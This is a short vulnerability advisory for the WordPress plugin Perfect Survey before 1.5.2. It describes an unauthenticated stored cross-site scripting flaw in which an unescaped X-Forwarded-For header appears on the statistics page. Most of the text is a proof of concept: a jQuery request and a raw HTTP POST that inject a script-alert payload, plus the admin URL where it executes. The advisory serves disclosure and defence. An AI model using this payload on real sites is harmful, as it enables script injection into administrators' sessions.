## WordPress Plugin Vulnerabilities

# Perfect Survey < 1.5.2 - Unauthenticated Stored Cross-Site Scripting

### Description

The plugin does not validate and escape the X-Forwarded-For header value before outputting it in the statistic page when the Anonymize IP setting of a survey is turned off, leading to a Stored Cross-Site Scripting issue

### Proof of Concept

jQuery.post({data:{
ps\_questions:{1:["1"]},
action:"save\_question\_data",
ID:"765",
},url:"https://example.com/wp-admin/admin-ajax.php",headers:{"X-Forwarded-For":"<script>alert(/XSS/)</script>"}})
POST /wp-admin/admin-ajax.php HTTP/1.1
Accept: \*/\*
Accept-Language: en-GB,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Forwarded-For: <script>alert(/XSS/)</script>
X-Requested-With: XMLHttpRequest
Content-Length: 60
Connection: close
ps\_questions%5B1%5D%5B%5D=1&action=save\_question\_data&ID=765
Then go to https://example.com/wp-admin/edit.php?post\_type=ps&page=single\_statistic&id=765
